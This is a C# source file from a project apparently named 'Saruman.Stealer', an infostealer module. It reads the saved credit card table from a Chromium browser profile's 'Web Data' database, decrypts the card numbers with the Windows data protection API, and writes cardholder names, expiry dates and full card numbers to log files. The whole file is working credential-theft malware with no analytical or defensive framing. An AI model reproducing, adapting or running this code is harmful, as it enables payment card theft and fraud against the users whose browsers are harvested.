using Saruman.sqlite;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Saruman.Stealer.Credit_Cards
{
    class Get_Credit_Cards
    {
        public static List<string> CC_List = new List<string>();

        public static List<string> CC = new List<string>();
        public static int CCCouunt;
        public static void Get_CC(string profilePath, string Browser_Name, string Profile_Name)
        {

            try
            {
                string text = Path.Combine(profilePath, "Web Data");

                CNT cNT = new CNT(Cookies.GetCookies.CreateTempCopy(text));
                cNT.ReadTable("credit_cards");
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    CCCouunt++;
                    try
                    {
                        CC.Add("Name : " + cNT.ParseValue(i, "name_on_card").Trim() + System.Environment.NewLine + "Ex_Month And Year: " + Convert.ToInt32(cNT.ParseValue(i, "expiration_month").Trim()) + "/" + Convert.ToInt32(cNT.ParseValue(i, "expiration_year").Trim() + Environment.NewLine + "Card_Number" + Cookies.GetCookies.DecryptBlob(cNT.ParseValue(i, "card_number_encrypted"), DataProtectionScope.CurrentUser).Trim()));

                    }
                    catch
                    {
                    }

                }
                for (int z = 0; z < CC.Count; z++)
                {
                    CC_List.Add("Browser : " + Browser_Name + Environment.NewLine + "Profie : " + Profile_Name + Environment.NewLine + CC[z]);

                }
                CC.Clear();

            }
            catch
            {

            }
        }
        public static void Write_CC(string Browser_Name, string Profile_Name)
        {
            using (StreamWriter streamWriter = new StreamWriter(Program.dir + "\\Browsers\\" + Profile_Name + "_" + Browser_Name + "_" + "Credit_Cards.log"))
            {
                for (int i = 0; i < CC_List.Count; i++)
                {
                    streamWriter.WriteLine(CC_List[i]);
                    streamWriter.WriteLine("\n");

                }
            }
        }
    }
}
